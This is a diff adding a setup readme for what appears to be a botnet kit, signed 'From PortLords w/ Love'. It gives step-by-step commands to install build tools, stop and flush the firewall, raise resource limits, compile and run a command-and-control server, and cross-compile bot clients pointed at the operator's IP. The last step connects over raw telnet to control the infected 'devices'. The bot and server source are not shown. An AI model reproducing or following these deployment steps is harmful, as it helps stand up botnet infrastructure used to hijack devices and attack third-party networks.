@@ -1,0 +1,45 @@
+Edit client.c (add IP:Port on line 44)
+
+Add your user:pass in Users.txt
+
+Run the following commands
+
+---------------------------------------------------------------------------------
+
+yum install python-requests yum install xinetd yum install vsftpd yum install python-paramiko yum install perl yum install bzip2 yum install screen yum install gcc
+
+---------------------------------------------------------------------------------
+
+service iptables stop; service httpd restart; sudo iptables -F; sudo service iptables stop;
+
+---------------------------------------------------------------------------------
+
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+---------------------------------------------------------------------------------
+
+gcc cnc.c -o cnc -pthread
+
+---------------------------------------------------------------------------------
+
+python cc.py client.c xxx.xxx.xxx.xx  // <- Server IP here
+
+---------------------------------------------------------------------------------
+
+screen ./cnc 1337 1 55555 (Then CTRL A + D) // <- Change 1337 to whatever port you added in client.c
+
+---------------------------------------------------------------------------------
+
+CTRL A + D <- detach screen
+(screen -x to see devices)
+(If it doesn't screen, run "pkill screen" and a couple times in a row, then try again)
+
+--------------------------------------------------------------------
+
+Now go to putty and login to the net
+Server IP + Your Port
+Connection type: RAW
+Save it in putty & connect
+login with user:pass from Users.txt
+
+From PortLords w/ Love
